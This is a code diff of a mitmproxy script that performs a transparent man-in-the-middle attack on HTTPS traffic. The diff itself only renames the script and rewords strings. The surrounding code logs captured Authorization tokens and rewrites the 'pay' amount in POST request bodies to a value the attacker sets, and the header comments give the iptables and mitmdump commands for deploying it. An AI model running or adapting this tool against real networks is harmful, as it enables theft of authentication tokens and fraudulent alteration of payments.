@@ -13,12 +13,12 @@
 #  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 #
 # 4. Fire up mitmproxy
-#  mitmdump --ssl-insecure --mode transparent --script /root/Desktop/sslstrip.py --set pay=[amount]
+#  mitmdump --ssl-insecure --mode transparent --script /root/Desktop/https_mitm.py --set pay=[amount]
 #
 
 import re
 import urllib.parse
-import typing  # noqa
+import typing
 import json
 
 from mitmproxy import http, ctx
@@ -31,12 +31,12 @@ def load(loader):
         name = "pay",
         typespec = typing.Optional[int],
         default = None,
-        help = "Add a new pay amount",
+        help = "Add a pay amount",
     )
 
 def configure(updates):
     if "pay" in updates and ctx.options.pay is None:
-        print("Please insert a new pay!")
+        print("Please insert a pay amount!")
         ctx.master.shutdown()
 
 def request(flow: http.HTTPFlow) -> None:
@@ -61,7 +61,7 @@ def request(flow: http.HTTPFlow) -> None:
         authorization = flow.request.headers.get('Authorization')
         ctx.log.info(f'[AUTHORIZATION TOKEN FOUND]: {authorization}')
 
-    # Modify POST request payload
+    # Modify POST request pay payload
     if flow.request.method == 'POST' and 'pay' in flow.request.content.decode():
         inject = json.dumps({ "pay": ctx.options.pay })
         ctx.log.info(f'[PAY PAYLOAD MODIFIED]: from {flow.request.content.decode()} to {inject}')
